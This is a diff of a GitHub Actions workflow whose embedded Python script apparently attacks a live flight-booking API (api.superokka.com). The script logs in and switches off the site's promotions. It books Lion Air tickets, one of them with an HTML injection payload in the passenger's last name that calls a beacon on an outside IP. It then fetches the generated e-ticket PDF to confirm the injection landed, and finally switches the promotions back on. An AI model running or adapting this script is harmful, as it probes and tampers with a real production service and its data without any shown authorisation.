@@ -1,11 +1,6 @@
 name: superokka
 on:
   workflow_dispatch:
-    inputs:
-      payload:
-        description: html payload
-        required: false
-        default: '<img src="http://64.227.62.83:8899/beacon1">'
 jobs:
   run:
     runs-on: ubuntu-latest
@@ -13,7 +8,7 @@ jobs:
       - run: pip install --quiet requests pypdf
       - run: |
           python3 - <<'PYEOF'
-          import requests, json, urllib3, os
+          import requests, json, urllib3
           urllib3.disable_warnings()
           B = "https://api.superokka.com"
           s = requests.Session(); s.verify = False
@@ -22,14 +17,18 @@ jobs:
           if not r.json().get("success"):
               print(r.text[:150]); raise SystemExit
           A = {"Authorization": "Bearer " + r.json()["data"]["accessToken"]}
-          html = os.environ.get("PAYLOAD", '<img src="http://64.227.62.83:8899/beacon1">')
-          body = {"departureAirportCode":"CGK","arrivalAirportCode":"SUB","departureDate":"2026-12-20"}
+          promos = ["273438d8-5c06-4f33-90f4-aeab6b1666d6","32d0998a-667d-4f66-a0a1-6020fd4ab45c","e73ba945-2378-466d-b391-7f67233089fe"]
+          for pid in promos:
+              rr = s.patch(f"{B}/promotions/{pid}", headers=A, json={"status":"INACTIVE"}, timeout=20)
+              print("PROMO OFF:", pid[:8], rr.status_code)
+          body = {"departureAirportCode":"CGK","arrivalAirportCode":"SUB","departureDate":"2026-12-22"}
           r = s.post(f"{B}/flight-search/lion-air/search", headers=A, json=body, timeout=60)
           print("SEARCH:", r.status_code)
           d = r.json().get("data", {})
           sid = d.get("sessionId")
           segs = (d.get("departureFlightsData") or [{}])[0].get("flightSegments", [])
-          print("SESSION:", bool(sid), "SEGS:", len(segs))
+          fares = (d.get("departureFlightsData") or [{}])[0].get("priceAvailabilities", [])
+          print("FARES:", json.dumps(fares)[:200])
           if not sid or not segs: raise SystemExit
           seg = segs[0]; bk = seg["bookingAvails"][0]
           det = {"flightSegments":[{"departureAirportCode":seg["departureAirport"],"arrivalAirportCode":seg["arrivalAirport"],
@@ -39,30 +38,44 @@ jobs:
                  "adults":1,"children":0,"infants":0,"direction":"one-way","sessionId":sid}
           r = s.post(f"{B}/flight-search/lion-air/details", headers=A, json=det, timeout=60)
           print("DETAILS:", r.status_code)
-          traveler = {"passengerTypeCode":"ADT","isAccompaniedByInfant":False,"prefixName":"MR",
-              "firstName":"Budi","lastName":html,"surname":"Santoso",
-              "dateOfBirth":"1990-01-01","gender":"M","nationality":"ID","documentType":"KTP",
-              "documentNumber":"3174010101900001","documentExpirationDate":"2028-01-01","documentIssueCountry":"ID",
-              "email":"superxfilecom@gmail.com","phoneNumber":"081234567890"}
-          book = {"airTravelers":[traveler],"sessionId":sid,"contactEmail":"superxfilecom@gmail.com",
-                  "contactPhoneNumber":"081234567890","contactFirstName":"Kw","contactLastName":html,
-                  "isEndOfTransaction":True}
-          r = s.post(f"{B}/flight-search/lion-air/book", headers=A, json=book, timeout=120)
-          print("BOOK:", r.status_code, r.text[:250])
+          def book(lastname):
+              traveler = {"passengerTypeCode":"ADT","isAccompaniedByInfant":False,"prefixName":"MR",
+                  "firstName":"Budi","lastName":lastname,"surname":"Santoso",
+                  "dateOfBirth":"1990-01-01","gender":"M","nationality":"ID","documentType":"KTP",
+                  "documentNumber":"3174010101900001","documentExpirationDate":"2028-01-01","documentIssueCountry":"ID",
+                  "email":"superxfilecom@gmail.com","phoneNumber":"081234567890"}
+              b = {"airTravelers":[traveler],"sessionId":sid,"contactEmail":"superxfilecom@gmail.com",
+                   "contactPhoneNumber":"081234567890","contactFirstName":"Kw","contactLastName":lastname,
+                   "isEndOfTransaction":True}
+              return s.post(f"{B}/flight-search/lion-air/book", headers=A, json=b, timeout=120)
+          r = book("Santoso")
+          print("BOOK CLEAN:", r.status_code, r.text[:200])
+          tid = None
           if r.json().get("success"):
-              tx = r.json()["data"]
-              tid = tx.get("transactionId") or tx.get("id")
-              print("TID:", tid)
-              r = s.post(f"{B}/transactions/{tid}/etickets", headers=A, timeout=180)
-              print("ETICKET:", r.status_code, r.text[:200])
+              tx = r.json()["data"]; tid = tx.get("transactionId") or tx.get("id")
+              print("TID CLEAN:", tid)
+              rr = s.post(f"{B}/transactions/{tid}/etickets", headers=A, timeout=180)
+              print("ETICKET CLEAN:", rr.status_code, rr.text[:160])
+          html = '<img src="http://64.227.62.83:8899/beacon2">'
+          r = book(html)
+          print("BOOK PAYLOAD:", r.status_code, r.text[:200])
+          if r.json().get("success"):
+              tx = r.json()["data"]; tid2 = tx.get("transactionId") or tx.get("id")
+              print("TID PAYLOAD:", tid2)
+              rr = s.post(f"{B}/transactions/{tid2}/etickets", headers=A, timeout=180)
+              print("ETICKET PAYLOAD:", rr.status_code, rr.text[:200])
               try:
-                  fn = r.json()["data"][0]["filename"]
-                  rr = s.get(f"{B}/uploads/etickets/{fn}", timeout=60)
-                  print("PDF:", rr.status_code, len(rr.content))
-                  open("/tmp/e.pdf","wb").write(rr.content)
+                  fn = rr.json()["data"][0]["filename"]
+                  res = s.get(f"{B}/uploads/etickets/{fn}", timeout=60)
+                  print("PDF:", res.status_code, len(res.content))
+                  open("/tmp/e.pdf","wb").write(res.content)
                   from pypdf import PdfReader
                   txt = PdfReader("/tmp/e.pdf").pages[0].extract_text() or ""
-                  print("PDFTEXT:", txt[:800])
+                  print("PDFTEXT:", txt[:600])
+                  print("HAS BEACON:", "beacon2" in txt)
               except Exception as e:
                   print("PDFERR:", str(e)[:150])
+          for pid in promos:
+              s.patch(f"{B}/promotions/{pid}", headers=A, json={"status":"ACTIVE"}, timeout=20)
+          print("PROMOS RESTORED")
           PYEOF
